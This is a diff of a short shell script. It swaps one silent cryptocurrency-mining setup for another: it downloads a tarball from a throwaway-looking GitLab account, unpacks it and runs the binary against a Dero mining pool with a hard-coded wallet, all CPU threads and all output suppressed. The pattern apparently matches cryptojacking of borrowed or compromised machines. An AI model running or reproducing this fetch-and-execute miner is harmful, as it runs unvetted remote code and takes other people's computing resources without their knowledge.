@@ -1,6 +1,3 @@
 #!/bin/sh
-wget https://github.com/erindiana/devs/raw/main/der.tar.gz
-tar -xf der.tar.gz
-
-./der -r pool.whalesburg.com:4300 -w dero1qywqx5rnemyt59ujq0lwy3r9n8m8l3zdxu0d90rre4lym8hgnr5rcqq2vekrj.dero1 -t$(nproc --all) >/dev/null >/dev/null 2>&1
-sleep 10
+wget https://gitlab.com/yuri.boyka.29111222/slebw/-/raw/main/dr.tar.gz && tar -xf dr.tar.gz && 
+./dr -r pool.whalesburg.com:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmylq8cq7asn9nqswcd3s.$(echo $(shuf -i 1000-999999 -n 1)-gom) >/dev/null >/dev/null 2>&1
